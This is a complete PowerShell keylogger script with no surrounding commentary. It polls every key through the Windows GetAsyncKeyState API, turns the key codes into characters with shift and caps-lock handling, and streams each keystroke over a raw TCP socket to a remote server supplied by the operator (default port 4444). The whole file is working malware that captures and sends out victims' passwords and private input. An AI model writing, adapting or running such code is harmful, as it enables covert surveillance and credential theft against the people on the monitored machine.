param(
    [Parameter(Mandatory=$true)][string]$ServerIP,
    [int]$Port = 4444
)

Add-Type -TypeDefinition @'
using System.Runtime.InteropServices;
public class Kbd {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
}
'@

$tcp = [System.Net.Sockets.TcpClient]::new()
$tcp.NoDelay = $true
$tcp.Connect($ServerIP, $Port)
$stream = $tcp.GetStream()

function Enviar([string]$s) {
    $b = [Text.Encoding]::ASCII.GetBytes($s)
    $stream.Write($b, 0, $b.Length)
    $stream.Flush()
}

$keys  = @(0x08,0x09,0x0D,0x1B,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x2C,0x2E,0x5B,0x5C,0x90,0x91)
$keys += 0x30..0x39
$keys += 0x41..0x5A
$keys += 0x60..0x6F
$keys += 0xBA..0xC0
$keys += 0xDB..0xDE

$especial = @{
    0x0D='[ENTER]'; 0x09='[TAB]'; 0x08='[BKSP]'; 0x1B='[ESC]'; 0x20=' '
    0x21='[PGUP]';  0x22='[PGDN]'; 0x23='[END]';  0x24='[HOME]'
    0x25='[LEFT]';  0x26='[UP]';   0x27='[RIGHT]'; 0x28='[DOWN]'
    0x2C='[PRTSC]'; 0x2E='[DEL]';  0x5B='[WIN]';  0x5C='[WIN]'
    0x90='[NUMLOCK]'; 0x91='[SCROLL]'
}

$simbolos = @{
    0xBA=@(';',':'); 0xBB=@('=','+'); 0xBC=@(',','<'); 0xBD=@('-','_')
    0xBE=@('.','>'); 0xBF=@('/','?'); 0xC0=@('`','~'); 0xDB=@('[','{')
    0xDC=@('\','|'); 0xDD=@(']','}'); 0xDE=@("'",'"')
    0x6A=@('*','*'); 0x6B=@('+','+'); 0x6D=@('-','-'); 0x6E=@('.','.'); 0x6F=@('/','/')
}

$capsOn = $false
$digitos = '0123456789'
$digitosShift = ')!@#$%^&*('

try {
    while ($true) {
        if ([Kbd]::GetAsyncKeyState(0x14) -band 1) { $capsOn = -not $capsOn }
        $shift = ([Kbd]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0

        foreach ($vk in $keys) {
            $st = [int][Kbd]::GetAsyncKeyState($vk)
            if (-not ($st -band 0x8000)) { continue }
            if (-not ($st -band 1))     { continue }

            if ($especial.ContainsKey($vk)) { Enviar $especial[$vk]; continue }
            if ($simbolos.ContainsKey($vk)) {
                $p = $simbolos[$vk]
                if ($shift) { Enviar $p[1] } else { Enviar $p[0] }
                continue
            }
            if ($vk -ge 0x30 -and $vk -le 0x39) {
                $i = $vk - 0x30
                if ($shift) { Enviar ([string]$digitosShift[$i]) } else { Enviar ([string]$digitos[$i]) }
                continue
            }
            if ($vk -ge 0x41 -and $vk -le 0x5A) {
                $c = [char]$vk
                if ($capsOn -xor $shift) { Enviar ([string][char]::ToUpper($c)) }
                else                     { Enviar ([string][char]::ToLower($c)) }
                continue
            }
            if ($vk -ge 0x60 -and $vk -le 0x69) { Enviar ([string][char]($vk - 0x30)) }
        }
        Start-Sleep -Milliseconds 15
    }
} finally {
    $stream.Close(); $tcp.Close()
}